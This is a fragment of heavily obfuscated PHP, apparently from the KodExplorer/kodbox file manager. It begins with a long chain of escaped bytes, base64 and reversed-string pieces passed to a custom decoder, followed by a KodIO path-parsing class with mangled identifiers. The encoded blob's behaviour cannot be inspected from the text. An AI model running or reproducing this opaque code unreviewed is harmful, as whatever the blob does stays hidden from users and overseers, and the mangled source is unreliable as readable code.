x29\x84\x6c\xf4\x69\xd1\x4f\xa\x50\x64\x2e\x94\xe9\x53\xdc\x24\xd2\xa8\x2a\x44\x67\xc9\xc2\x94\x8c"."\305\362\302\332\235\106\143\242\46\376\122\5\177\43\31\306\260\6\346\147\255\161\135\156\334\64\172\202\210\261\41\245\307\57\104\303\214\142\356\107\307\25\111\270\222\135\310\251\344".strrev('*äÌfs(ó`Óm‡®½âBB"´’îROb3B]±ÕE+ªøeŞ\\Ñğ3÷Ü9').base64_decode('k637Vk2u451YNkdlS1qxVmm9YEyZKZQWJz9DMQUhYQRwOXeH8CeoVOBN8pQJcSFzVQ==').base64_decode('AYBX52ay+Bq5KdyTmzkL7BAOUlUPgvy+W9GxsMGNu7zgxjrGlJNZoFS2Rsis2+qgEQ==')."\170\157\155\260\310\136\235\263\106\46\321\172\65\237\12\244\122\177\174\365\23\320\131\132\317\32\362\321\141\45\253\174\310\134\1\272\127\263\222\320\41\236\325\121\201\364\244\247\252"."\64\60\226\333\135\7\75\102\272\41\242\145\237\202\164\170\364\167\340\205\130\125\15\217\147\223\24\211\212\145\124\221\261\356\102\23\304\125\324\240\240\43\44\257\54\335\160\16\343"."\207\163\327\125\112\212\21\272\274\211\17\326\2\51\144\213\212\126\20\305\207\27\223\56\357\273\200\246\260\164\333\332\324\142\356\264\227\316\376\46\6\276\205\271\350\260\12\331\242"."\52\152\247\103\252\253\162\23\272\242\273\305\43\250\65\20\321\215\154\125\130\305\130\15\132\101\253\40\205\112\214\326\16\204\314\107\16\215\66\27\361\371\50\130\343\57\203\152\105".base64_decode('U9gsuydVLQCP21iEBaPOSdVCtK4+D4la4aKIoq39rLGoxaXNCjSDhtks9GzP6bG8jw==').strrev('kÑna.f±¨1äT²¦ë²"µ4+ÙUİîhüàÊÉ´cœı!0&î@9É·Iû·B').base64_decode('pFL7cPyacNQKlJ/ksRxxdqTVE1SWkajKJKZ4Ef9xsqmuazjFSbTISpqBjTewbUybig==')."\271\322\126\216\263\236\250\127\367\214\226\120\70\32\22\125\166\136\266\357\73\270\165\243\247\155\251\263\305\202\222\0\277\164\325\331\30\70\113\342\121\122\121\365\251\321\76\250\125"."\xd4\x49\x5b\x50\x94\x2a\x63\xc0\xc0\x94\xcd\xb4\x55\x66\x72\x13\xc5\xed\x42\xd1\x49\x98\x23\x6a\x34\x6a\x9\x79\x11\xbd\x93\xab\x55\x5\xf5\x74\xa3\x90\x1d\xba\xa\x43\x69\xa7\xa2\xfa\xcd\x51\x3c"."\175\223\230\342\270\135\141\104\375\115\232\340\140\165\136\63\217\314\123\22\130\376\132\314\254\107\202\251\330\125\60\101\115\262\62\44\56\222\74\54\46\232\152\150\52\7\207\266\27".base64_decode('tALmwoT2wFbTSLXUqa7smVqEfbOqCE+jTJR0BKKm2NQjex/OYq2UGp9iScqIpoVrJA==')."\30\35\71\110\220\60\151\242\262\243\277\251\331\217\236\241\124\73\16\74\20\301\76\102\26\226\202\6\364\214\210\144\14\124\5\41\237\314\143\51\327\161\314\71\210\164\203\300\374"."\240\210\371\144\16\123\104\254\254\360\22\246\120\43\144\236\103\124\262\56\157\371\271\166\41\315\320\127\53\235\217\20\115\356\164\351\203\172\62\220\365\341\116\7\247\355\262\61\334".strrev('äª±@ñ­XYN	9W»PU>àVÔŒ¯'."\r".'w@K©Ù)Yén¨'."\0".'TñÓRå‰y')."\x16\xae\xf0\xea\x65\xc3\x1c\x6a\xe1\xea\x12\xc5\xf5\x4c\xa\x3b\x44\xaa\x2a\x44\x37\x69\xa1\x5\x6a\xab\x11\x4c\x15\xc8\x69\xbb\x22\x5c\x35\xca\x55\x5a\x80\x44\xae\x71\x13\x8d\x55\x51\x64\xd4\xdb"."\xdd\x1b\x14\xa0\x76\xb1\x3c\xb9\xb4\x41\xba\x72\xea\x40\xfd\x23\x73\xc2\x84\x3\xde\x78\x21\x97\xd6\xa2\xf1\xe5\x91\x8e\x50\xb4\x33\x92\x5c\xa1\x8d\x98\x8e\x26\x55\x33\xd8\x3\xe\xee\xa5\xcc\x84"."\xa6\x7c\xe0\x11\xab\x87\xc4\x2b\x3\x34\xe8\x1f\x22\x27\x6\x7f\x46\x9c\xaa\x6c\x79\x7e\x52\x9e\xcb\x56\x9e\x61\x72\x57\xcb\xf1\xcf\x2c\x57\xd5\x58\xa4\x36\x28\xf9\xaa\x32\x54\x14\x5c\x23\x77\x5e"."\212\101\225\314\245\262\131\235\177\322\244\32\101\112\213\225\2\225\32\255\201\374\265\277\300\136\200\120\163\23\106\310\54\116\327\370\134\161\54\147\347\344\302\307\22\223\152\355\241"."\xce\x9e\x48\x4c\xf\x45\xa3\xf1\x55\x2e\x45\x3a\x29\x4\x2f\x8b\xe7\x35\x32\xea\x6b\x1c\xca\xcc\xc8\x49\xe0\x5f\xaf\xf6\x30\x6\xfe\x99\x54\xaf\xe7\x1e\x31\xa\x9f\x3e\xd5\xd9\x5c\x9\xaf\x77\xe0"."\xc9\x40\xe1\xb6\x9f\x47\x95\xa7\x73\x4a\x65\x23\x67\x9b\xa\x80\x3f\xf2\x32\x17\x4c\x3e\x8c\x7c\xde\xf5\x10\x5e\x7e\x58\x89\x56\xdc\x3b\x6b\xcd\x4f\xe9\xfc\x3\x8\x53\x1c\xdb\xd5\xca\x90\x88\x2c"."\357\116\375\257\233\232\313\110\247\122\271\14\352\226\10\13\75\356\321\277\103\175\64\21\277\131\365\74\320\147\76\64\344\223\27\142\72\163\265\203\57\232\131\354\70\4\274\72\207"."\105\342\72\223\15\353\362\23\204\73\51\117\226\324\33\311\140\46\50\206\230\7\250\357\274\60\136\203\321\210\74\230\320\354\120\33\375\34\77\256\222\123\70\225\337\341\21\6\25"."\x23\x9\x9d\x80\x71\x76\xdd\xc8\x7b\x9e\x4c\xfa\x54\xef\xfc\x55\xdf\x60\xee\xf9\x79\x5a\x3f\xed\xe\xc9\x39\x28\x3b\x47\x62\xe2\x6d\xe\x59\xd4\x9b\x52\xa3\x1\x24\x59\x93\x32\x2d\x91\x41\x6b\xd3"."\32\371\353\135\342\335\5\155\51\332\33\313\17\60\17\127\341\102\311\161\35\345\273\125\135\162\145\156\70\200\161\72\362\250\106\165\245\254\302\144\25\300\45\310\212\142\273\204\376"."\x1f\x7d\x75\xa2\x38\x6c\xa9\xe3\xc7\x8\x32\x35\xc\xe0\xaf\xec\x71\x99\x81\x8f\x1c\x1d\x4c\xa7\xfa\x89\x1e\x5e\xfc\xff\x49\x41\x9e\x98\x54\x5c\x1a\xba\x2b\xa9\x6e\x90\xed\xdd\xea\x24\xdb\x45\x5f"."\37\312\132\343\356\247\367\50\304\373\336\220\353\245\41\145\321\60\263\130\365\155\44\167\41\137\325\353\37\32\173\65\125\43\250\16\263\110\175\51\341\231\224\145\126\76\75\213\377"."\14\300\57\156\147\336\106\160\102\5\237\234\43\220\252\43\233\313\147\312\102\371\107\2\172\114\51\50\140\245\250\376\213\201\257\303\262\147\311\72\221\46\303\203\43\265\36\241\242"."\x9e\xeb\xdc\xef\xa6\xc8\xe7\x68\xe4\xde\xe9\x7e\x9e\x43\x5c\x61\xdb\x72\x31\xd8\x8e\xeb\x41\x98\x94\x95\x32\x46\x7c\x9c\x23\xa3\x54\x4d\xc6\xda\x27\xd5\xb0\xaa\x93\xca\x7a\x41\x12\x51\x98\x97\x11"."\363\175\234\222\1\337\165\313\370\330\233\143\234\324\171\137\64\121\126\232\240\237\152\351\221\274\65\144\344\23\134\147\316\145\106\122\46\247\51\23\367\0\127\66\16\12\32\245\222"."\274\103\123\267\114\362\277\313\174\17\322\372\122\335\72\63\102\327\371\75\174\122\342\234\162\373\306\201\160\23\127\51\106\370\205\206\13\132\126\316\171\252\63\120\176\347\50\15\306"."\40\73\151\147\57\277\144\204\1\123\253\304\213\137\41\22\357\122\136\21\17\126\137\24\123\155\100\240\50\352\173\364\160\215\37\120\17\142\220\101\133\252\111\324\160\55\144\212\112"."\x84\x1b\xe6\xaf\xba\x31\x4a\xa1\x32\xee\x9f\x2\x55\x5e\xdb\x81\xd7\xe3\x6a\x3d\x9e\xc3\x31\x9f\xfd\x74\x9a\xc3\xe2\x50\x43\xe3\x72\x73\x57\x1d\x69\x48\x75\x12\xef\xc3\x6e\xd5\x8f\xd4\xe1\x83\x74".base64_decode('uHTgNboaT8xN+0KdT9oGftqbPNKCzf3oMO2HYA3EuaHq6OE9dYhh9RRIeAc5ZVXLhw==')."\345\125\272\353\375\74\245\327\100\332\252\337\340\123\206\101\351\167\245\234\367\61\255\2\37\72\242\253\371\214\237\353\205\40\357\204\326\170\10\360\63\53\4\125\145\166\350\312\270"."\xa9\x5e\xeb\xd2\xa1\x32\x5e\xd3\x7a\xb3\xe5\x5c\xb8\xab\x97\x4d\x69\xdd\xc2\x9d\x7e\x56\x6d\x10\x6b\xa\x99\xe6\xf9\xb\x8f\x55\x85\x1b\x72\xa\xe5\x5d\x27\x98\xef\xc3\x1d\x2c\x70\x2b\x12\x29\x34".base64_decode('Nxpq6GlUXf0s0a09Xv1opGcH+N8tGHl64FkVne7q53WrRoDhqaLtpGyIHv0Vi6qU2A==').base64_decode('ctXxLVC+FOn+FmcfavRD2ffkYuEv/Vl5esYuUNm9UzbcB8pa5yY2EnhIy7FHsk1v2w==').strrev('S2¤§‰âÅÿ¢P¦ÕËCZ›m‡˜¼f±2/ºqh‚ŠòÇFµ++&E4€ÀÙ')."\107\322\122\343\45\107\105\375\343\123\332\315\271\73\161\36\364\33\216\137\101\110\105\174\150\72\161\66\301\100\42\344\261\325\335\127\117\365\244\230\254\143\320\247\115\227\251\232\305".strrev('û<­WTMu"¬bVªùœUÒ×W-‚é7+1Õ©&ÍÏBÌıNiÉF–æ²ş”|S').base64_decode('J6VCTIwEPYIFzdQYWDNDy4VxoaFoo7lFVXSolYdbLTUsp4CS/Ti6RSVfdx01SbzT8w==')."\252\57\43\121\336\247\176\161\210\30\135\220\44\117\261\121\165\235\153\304\133\147\256\163\216\355\175\375\220\160\173\252\233\143\22\365\276\21\13\264\221\231\0\360\257\51\273\253\334"._kodDe('MlE0QhS0FQ50UcsWM9R90R46kSiM7FBw+btZk8fVyPsY0w/r683m66vKm0fndMRkfsM=')."\xd3\xc0\xcb\x81\xff\x46\x96\x6f\x4a\x71\x72\xcd\xa5\xc0\x9e\x7e\xb8\x77\xd0\x19\x80\x45\xe2\x19\x6c\x25\x2e\xf4\x9c\xd1\x11\x18\xfa\x7\x33\xf0\x36\xcc\xc8\xe7\x95\x7d\xb6\xf6\x89\xa5\xea\xd1\x55"."\x82\x7c\xa3\xe2\x5\xcf\x5a\x11\xaf\xc9\x9b\xf7\x1\xd6\x7e\x7c\xaa\x9c\xbd\xad\x3a\x58\x2b\xa3\x24\x43\xe2\x60\x54\x3\x8f\x39\x8\xf9\x61\xe5\x11\xee\x5c\x7a\xb4\xc6\x55\x36\x53\xe8\x74\x3b\x89".strrev('K5P.K¥J4f\'<x?¢Î;<%ãT-SÑ€=¹‰é¥AkAM„'."\r".'²lªøV').strrev('†o½Â\'‰hî^ªj ´º¡³Z¾ô—[[&y&‡=‡¶ºøÚæ‡TÄæ¹')."\x37\xf9\x3d\xd5\x89\xb7\x36\xdd\xb8\xee\x7a\xef\x91\x6b\x83\x90\x5\x92\xa0\x52\xe\x94\x5b\xb1\xb\x20\x76\x13\xec\xaf\x2e\xc3\xf1\x3a\x29\xf3\x4c\xb3\xb2\x6a\xaf\x6f\xd1\x28\x29\xc4\xa3\x21\x75"."\x3c\x90\x4e\xf4\x96\x2d\xc6\xb\xba\xa1\x42\xf2\xa3\xa8\xf6\x2a\xef\x5e\x57\xb1\x77\x1c\x3c\x2b\x50\xb5\x49\x21\xc9\x74\xcd\x14\x39\xfd\xc9\x8b\xc7\x9c\xc5\x9c\xcd\x63\xd1\xbe\x9e\x6\x66\xdf\x4".base64_decode('iE4OJF2WRBnl4Wm6MKUTSKrIzGSQKh+AJoeKxj6AXJJCW33Xw12S2mC4l+BxtbKlrQ==').base64_decode('sq1kE/BaeSliqpIQNY0+Guy4pki+G+B9L4DJB/iR33Xyh6tiFaRcnRL2PeN+gIQlMg==').strrev('Ü®U?r–ñr8C1¡×æKËÒ#2ÍKò:¡JÌ’¨¹+nE^Œğ«İ÷?Ë”…ú0').strrev('SŒ¬ˆ(ß<¬®÷£ÄdÏ»’ZrLcaíåë^ˆû’¶z1`¬Â¡äã/«†B¦Ô')."\x53\x2c\x93\xa5\xd1\x80\x39\xee\x7d\x9a\x38\xa0\x5a\x33\xbb\x32\x56\x43\xa5\xe5\xb2\x52\x5e\x5e\xcb\xc8\x6e\x52\x58\xad\xee\xb3\x85\xe6\x2e\xae\x5a\x46\xb\xa4\x92\x20\xfe\x84\x84\x50\x6b\x50\x4e".base64_decode('UlTvQ+o78K4IgYH8pNsOW2QTc0byMLMjvwvqORtS2QyyHZ4kW31W2H0Bq0owFBQw8w==').base64_decode('UaU69XJ22gLJ2h+RWOkeYsWAXSbgDmm5Bl8hkaJjkDOhJrqa451adqyR6MuBBSYY5g==')."\151\41\167\22\317\157\172\132\257\26\360\366\214\227\260\307\163\116\72\253\234\265\252\23\253\341\345\252\101\205\17\325\156\257\267\125\70\246\336\23\250\254\244\252\75\212\206\107\312"."\xaa\x51\x86\xb7\xa8\x66\x31\x9e\x44\x4b\x4a\x9e\xd7\x55\x76\x9a\x21\xa0\x65\x79\x12\x2d\x5b\x95\x8c\x85\x15\x81\x8d\x52\xce\x31\x2a\xf6\x34\xdd\xab\x1e\x3c\x90\x62\x64\x6a\x74\xd8\x73\xd6\xe7\x59".base64_decode('pxvPmpmrPwcY583NxB61WyGlFZ6b9lqtqJl52lbI3J5doBatxZQa1JVTjmm1T6RGRg==')."\65\231\227\151\65\364\103\370\47\351\26\256\172\251\252\221\254\52\233\324\126\107\111\324\244\14\266\133\117\304\3\127\307\15\234\234\2\363\5\310\110\116\243\371\334\250\324\303\103"."\65\374\131\56\362\137\51\216\26\55\261\245\144\244\232\45\125\21\17\225\275\343\134\125\233\33\215\213\25\305\157\154\115\253\0\37\225\35\124\237\322\363\6\136\65\50\346\24\374"."\x58\x65\x39\xb9\xb4\xe9\x76\x4e\xab\x3a\xab\xe2\xe9\xf8\x91\xbc\x22\x8c\xf4\xc8\x1\xa5\x24\xc3\xa5\xc7\x50\x43\x52\xc6\x40\xc0\xf6\x49\x91\x3c\xaf\x4f\x61\x68\x24\x4e\xb8\x2c\x5f\x38\x1b\x1\x37"."\x19\xfc\x12\xb4\x83\x5e\xb6\x8b\xeb\x2f\xe6\x58\x95\x6f\xbb\x3c\x39\x69\x95\x1d\x1f\x4d\x4b\x59\x25\xf6\xdb\x6e\x39\x8e\x54\xa\xe0\xa2\x3\xc6\x2b\xd2\xbd\xd3\xa7\xe8\xbc\x90\x90\xbc\xeb\xa2\x8d".base64_decode('YpcoDG0Z9WFBuI6lZ/KkyVMZzXJF6OWMiKhbI1zLdlU8F8cSQA7AQ9YEeoiilvayPQ==')."\xf2\xfa\xc6\xf0\xf2\x83\x92\x95\x1\x54\x54\x35\x78\x98\x3f\x3\x3b\xc8\x53\x82\xf0\xf4\x81\x9f\xd5\x1\x2f\xa0\x5\xd6\x97\x46\x5c\xc5\xf9\xdb\x51\x42\xd3\xf6\xd3\x6a\x0\x11\xae\xac\x82\xfb\x3d"."\147\262\65\60\35\112\246\222\125\111\275\241\144\162\125\74\321\311\335\244\127\45\263\122\212\106\124\125\122\157\167\74\66\135\132\270\47\24\211\126\245\121\345\251\230\56\175\215\361"."\xa4\x48\x2f\x6b\x25\xbb\x81\x9c\xae\x15\x91\x8e\x15\xb2\x25\xec\xae\x5b\xde\xc\x94\xb2\x16\xa\xfc\xf1\xe6\x24\x69\xe4\x51\xe\xa0\x18\xe6\x9a\x5\xe9\x64\x4e\x96\x71\x8b\x37\xd4\x79\xb5\xd1\x1b".base64_decode('pAi43xzy6CgiwkJFVPEpBnUnSgClbuPFuhc8t7y8D7gu+RU4WxuM2Cg4p+7JDDC35g==')."\0\251\122\345\352\133\16\226\52\7\200\66\354\4\13\264\346\326\133\103\312\55\6\77\361\200\45\54\14\251\242\334\306\303\256\144\307\30\251\171\327\315\245\207\164\365\113\271\336"."\377\5\165\311\115\275\134\256\0\0".strrev('').""."", 10, -8))); goto cï×Œ †˜²; Bõ„Œ–¼»É: class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\162\x52\145\143\171\143\x6c\145\175"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\x46\151\x6c\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\106\x69\154\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\x70\122\x6f\157\164\x53\145\154\x66\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\123\150\x61\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\162\x65\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\111\164\x65\155\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\154\157\143\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\x52\x65\156\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\145\x72\x7d"; public static function typeList() { $µêÚö»© =& $_SERVER[ú÷îèÆÜ]; return array($µêÚö»©[1292] => self::KOD_SOURCE, $µêÚö»©[1293] => self::KOD_USER_RECYCLE, $µêÚö»©[1294] => self::KOD_USER_FAV, $µêÚö»©[1295] => self::KOD_USER_FILE_TAG, $µêÚö»©[1296] => self::KOD_USER_FILE_TYPE, $µêÚö»©[1297] => self::KOD_GROUP_ROOT_SELF, $µêÚö»©[1298] => self::KOD_USER_SHARE, $µêÚö»©[1299] => self::KOD_USER_SHARE_LINK, $µêÚö»©[1300] => self::KOD_USER_SHARE_TO_ME, $µêÚö»©[1301] => self::KOD_SHARE_ITEM, $µêÚö»©[1302] => self::KOD_SHARE_LINK, $µêÚö»©[1303] => self::KOD_SEARCH, $µêÚö»©[1304] => self::KOD_BLOCK, $µêÚö»©[1305] => self::KOD_IO, $µêÚö»©[1306] => self::KOD_USER_RECENT, $µêÚö»©[1307] => self::KOD_USER_DRIVER); } public static function parse($ÔåüßŒ) { $ŞÈ“ºØ =& $_SERVER[ú÷îèÆÜ]; $ÔåüßŒ = self::clear($ÔåüßŒ); $»”³÷«ê = array_values(self::typeList()); preg_match($ŞÈ“ºØ[1308], $ÔåüßŒ, $–ßºŒ©å); $“ŸçÜš = array($ŞÈ“ºØ[473] => !1, $ŞÈ“ºØ[1309] => !1, $ŞÈ“ºØ[470] => !1, $ŞÈ“ºØ[94] => $ÔåüßŒ, $ŞÈ“ºØ[1210] => !1, $ŞÈ“ºØ[1209] => $ŞÈ“ºØ[22]); if (is_array($–ßºŒ©å) && count($–ßºŒ©å) == 5) { $–ß©»Ğà = $ŞÈ“ºØ[1310] . $–ßºŒ©å[2] . $ŞÈ“ºØ[380]; if (in_array($–ß©»Ğà, $»”³÷«ê)) { $“ŸçÜš[$ŞÈ“ºØ[1210]] = $–ßºŒ©å[1]; $“ŸçÜš[$ŞÈ“ºØ[43]] = $–ß©»Ğà; $“ŸçÜš[$ŞÈ“ºØ[1311]] = substr($–ß©»Ğà, 1, -1); $“ŸçÜš[$ŞÈ“ºØ[452]] = $–ßºŒ©å[3]; } $“ŸçÜš[$ŞÈ“ºØ[1209]] = $–ßºŒ©å[4]; } $‰ˆë¥ßÙ = array($ŞÈ“ºØ[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $“ŸçÜš[$ŞÈ“ºØ[1274]] = in_array($“ŸçÜš[$ŞÈ“ºØ[43]], $‰ˆë¥ßÙ); return $“ŸçÜš; } public static function isTruePath($¿ùïÕé„) { $Åò×Êà‹ =& $_SERVER[ú÷îèÆÜ]; if (substr($¿ùïÕé„, 0, 1) != $Åò×Êà‹[1310]) { return !0; } if (strpos($¿ùïÕé„, $Åò×Êà‹[460]) === 0) { return !0; } if (strpos($¿ùïÕé„, $Åò×Êà‹[1278]) === 0) { return !0; } if (strpos($¿ùïÕé„, $Åò×Êà‹[1312]) === 0) { return !0; } if (strpos($¿ùïÕé„, $Åò×Êà‹[1313]) === 0) { return !0; } if (strpos($¿ùïÕé„, $Åò×Êà‹[1314]) === 0) { return !0; } return !1; } public static function clear($Àš°Å¼ú) { $øëÉò™ı =& $_SERVER[ú÷îèÆÜ]; $Àš°Å¼ú = str_replace(array($øëÉò™ı[1119], $øëÉò™ı[11]), $øëÉò™ı[63], $Àš°Å¼ú); $Àš°Å¼ú = str_replace($øëÉò™ı[107], $øëÉò™ı[18], $Àš°Å¼ú); $ÁëæÚò´ = $øëÉò™ı[1315]; if (substr($Àš°Å¼ú, 0, 3) == $øëÉò™ı[1316]) { $Àš°Å¼ú = substr($Àš°Å¼ú, 3); } while (strstr($Àš°Å¼ú, $ÁëæÚò´)) { $Àš°Å¼ú = str_replace($ÁëæÚò´, $øëÉò™ı[18], $Àš°Å¼ú); } $Àš°Å¼ú = preg_replace($øëÉò™ı[1317], $øëÉò™ı[18], $Àš°Å¼ú); if ($Àš°Å¼ú == $øëÉò™ı[18]) { return $øëÉò™ı[18]; } $Àš°Å¼ú = rtrim($Àš°Å¼ú, $øëÉò™ı[18]); return $Àš°Å¼ú; } public static function pathTrue($—ƒ¥ôò¤) { $¸©Âã¹ñ =& $_SERVER[ú÷îèÆÜ]; if (!$—ƒ¥ôò¤) { return $¸©Âã¹ñ[22]; } $—ƒ¥ôò¤ = str_replace($¸©Âã¹ñ[570], $¸©Âã¹ñ[18], str_replace($¸©Âã¹ñ[1318], $¸©Âã¹ñ[18], $—ƒ¥ôò¤)); $—ƒ¥ôò¤ = str_replace($¸©Âã¹ñ[570], $¸©Âã¹ñ[18], str_replace($¸©Âã¹ñ[1318], $¸©Âã¹ñ[18], $—ƒ¥ôò¤)); if (!strstr($—ƒ¥ôò¤, $¸©Âã¹ñ[1316])) { return $—ƒ¥ôò¤; } $àõïÒ = explode($¸©Âã¹ñ[18], $—ƒ¥ôò¤); foreach ($àõïÒ as $ŸÅ®ÍÔ” => $ÈŠÖşßÄ) { if ($ÈŠÖşßÄ !== $¸©Âã¹ñ[1319]) { continue; } for ($†öœ²• = $ŸÅ®ÍÔ”; $†öœ²• >= 0; $†öœ²•--) { if ($àõïÒ[$†öœ²•] === $¸©Âã¹ñ[20] || $àõïÒ[$†öœ²•] === $¸©Âã¹ñ[1319] || $àõïÒ[$†öœ²•] === -1) { continue; } if ($àõïÒ[$†öœ²•] === $¸©Âã¹ñ[22]) { $àõïÒ[$ŸÅ®ÍÔ”] = -1; break; } $àõïÒ[$ŸÅ®ÍÔ”] = -1; $àõïÒ[$†öœ²•] = -1; break; } } $í”­äìÅ = array(); foreach ($àõïÒ as $ÈŠÖşßÄ) { if ($ÈŠÖşßÄ !== -1) { $í”­äìÅ[] = $ÈŠÖşßÄ; } } $ãı§õâ³ = implode($¸©Âã¹ñ[18], $í”­äìÅ); if (strpos($ãı§õâ³, $¸©Âã¹ñ[1320]) === 0) { $ãı§õâ³ = $¸©Âã¹ñ[1316] . substr($ãı§õâ³, strlen($¸©Âã¹ñ[1320])); } return $ãı§õâ³; } public static function sourceID($»—­™’¦) { $Ï¥´˜’— =& $_SERVER[ú÷îèÆÜ]; $¯ÂêüË = self::parse($»—­™’¦); if ($¯ÂêüË[$Ï¥´˜’—[43]] !== self::KOD_SOURCE) { show_json(LNG($Ï¥´˜’—[1321]), !1); } return $¯ÂêüË[$Ï¥´˜’—[452]]; } public static function make($ßÄ¥šÜ¯) { if (!$ßÄ¥šÜ¯) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ßÄ¥šÜ¯)); } public static function makeShare($¼“¾€Åõ, $ë‹ïí‚–) { return self::makePath(self::KOD_SHARE_ITEM, $¼“¾€Åõ, $ë‹ïí‚–); } public static function makeFileTypePath($£ŞÏ¶§Å) { return self::makePath(self::KOD_USER_FILE_TYPE, $£ŞÏ¶§Å); } public static function makeFileTagPath($±·ºÅÏ) { return self::makePath(self::KOD_USER_FILE_TAG, $±·ºÅÏ); } public static function makePath($Ñ¼º³­í, $¡ûßÖ¥ü = '', $ıš¡©µÉ = '') { $Š„¤»Š‚ =& $_SERVER[ú÷îèÆÜ]; $”ŸÃ“Û€ = substr($Ñ¼º³­í, 1, -1); $İÈêÚÊ = $Š„¤»Š‚[1322] . $”ŸÃ“Û€ . $Š„¤»Š‚[1323] . $¡ûßÖ¥ü . $Š„¤»Š‚[1324]; $İÈêÚÊ = $ıš¡©µÉ ? $İÈêÚÊ . $ıš¡©µÉ . $Š„¤»Š‚[18] : $İÈêÚÊ; return $İÈêÚÊ; } public static function hashPath($»•‰åÃš, $Šîøşû£ = true) { $ÆèôŸ®Â =& $_SERVER[ú÷îèÆÜ]; $†¥çğÛ¼ = is_array($»•‰åÃš) ? $»•‰åÃš : IO::info($»•‰åÃš); $Š¶Á¦ÓÖ = _get($†¥çğÛ¼, $ÆèôŸ®Â[1325], $ÆèôŸ®Â[22]); if (!$Š¶Á¦ÓÖ && isset($†¥çğÛ¼[$ÆèôŸ®Â[229]])) { $Š¶Á¦ÓÖ = trim($†¥çğÛ¼[$ÆèôŸ®Â[229]], $ÆèôŸ®Â[128]); } if (!$Š¶Á¦ÓÖ && isset($†¥çğÛ¼[$ÆèôŸ®Â[191]]) && $†¥çğÛ¼[$ÆèôŸ®Â[191]]) { $†¥çğÛ¼ = IO::info(KodIO::make($†¥çğÛ¼[$ÆèôŸ®Â[191]])); $Š¶Á¦ÓÖ = _get($†¥çğÛ¼, $ÆèôŸ®Â[1325], $ÆèôŸ®Â[22]); } $É€¢ºí = md5($†¥çğÛ¼[$ÆèôŸ®Â[94]] . $†¥çğÛ¼[$ÆèôŸ®Â[86]] . $†¥çğÛ¼[$ÆèôŸ®Â[95]]); if (!$Š¶Á¦ÓÖ && file_exists($†¥çğÛ¼[$ÆèôŸ®Â[94]])) { $Š¶Á¦ÓÖ = Cache::get($É€¢ºí . $ÆèôŸ®Â[1326]); $Š¶Á¦ÓÖ = !1; if (!$Š¶Á¦ÓÖ) { $Š¶Á¦ÓÖ = IO::hashSimple($†¥çğÛ¼[$ÆèôŸ®Â[94]]); Cache::set($É€¢ºí . $ÆèôŸ®Â[1326], $Š¶Á¦ÓÖ, 3600 * 24 * 30); } } if ($Šîøşû£ && !$Š¶Á¦ÓÖ) { } return $Š¶Á¦ÓÖ ? $Š¶Á¦ÓÖ : $É€¢ºí; } public static function hashPathSafe($ïÏÂª™Ş, $ªœã×‰É = true) { $ ¥œÒÇØ =& $_SERVER[ú÷îèÆÜ]; $Ùä¯½ = self::hashPath($ïÏÂª™Ş, $ªœã×‰É); return md5($Ùä¯½ . $ ¥œÒÇØ[1327] . Model($ ¥œÒÇØ[810])->get($ ¥œÒÇØ[811])); } public static function initSystemPath() { $á§ıÀÂ =& $_SERVER[ú÷îèÆÜ]; if (defined($á§ıÀÂ[1328])) { return; } define($á§ıÀÂ[1328], self::systemPath($á§ıÀÂ[189])); define($á§ıÀÂ[1329], self::systemPath($á§ıÀÂ[1330])); define($á§ıÀÂ[1331], self::systemPath($á§ıÀÂ[1332])); define($á§ıÀÂ[1333], self::systemPath($á§ıÀÂ[1334])); IOHistory::bindEvent(); } public static function systemPath($¯™ğ˜¹á) { $¸¦Óš  =& $_SERVER[ú÷îèÆÜ]; $õ°¡¦¤ = $¸¦Óš [1335] . ucfirst($¯™ğ˜¹á); $äŠÏ‹¿ = Model($¸¦Óš [810])->get($õ°¡¦¤); if ($äŠÏ‹¿) { return $äŠÏ‹¿; } if ($¯™ğ˜¹á == $¸¦Óš [189]) { $äŠÏ‹¿ = self::make(Model($¸¦Óš [865])->systemRootPathAdd($¸¦Óš [583])); } else { $äŠÏ‹¿ = self::systemPath($¸¦Óš [189]); $ÔıòôÚä = self::sourceID($äŠÏ‹¿); $äŠÏ‹¿ = self::make(Model($¸¦Óš [865])->mkdir($ÔıòôÚä, $¯™ğ˜¹á)); } Model($¸¦Óš [810])->set($õ°¡¦¤, $äŠÏ‹¿); return $äŠÏ‹¿; } public static function systemFolder($öÆ¿»İÜ) { $óëá¥›† = IO_PATH_SYSTEM_SOURCE . $öÆ¿»İÜ; $‰ëœœı” = Cache::get($óëá¥›†); if (!$‰ëœœı”) { $™§ÔƒŸá = IO::infoFullSimple($óëá¥›†); if (!$™§ÔƒŸá) { $‰ëœœı” = IO::mkdir($óëá¥›†, REPEAT_SKIP); } else { $‰ëœœı” = $™§ÔƒŸá[$_SERVER[ú÷îèÆÜ][94]]; } Cache::set($óëá¥›†, $‰ëœœı”, 3600 * 10); } return $‰ëœœı”; } public static function defaultDriver() { return Model($_SERVER[ú÷îèÆÜ][807])->defaultDriver(); } public static function defaultIO() { $¾‰Ê¸Ş§ =& $_SERVER[ú÷îèÆÜ]; $¥š”¥• = self::defaultDriver(); return $¾‰Ê¸Ş§[1336] . $¥š”¥•[$¾‰Ê¸Ş§[452]] . $¾‰Ê¸Ş§[1324]; } public static function defaultDriverInit() { static $„’ôÂÔ© = false; if ($„’ôÂÔ©) { return 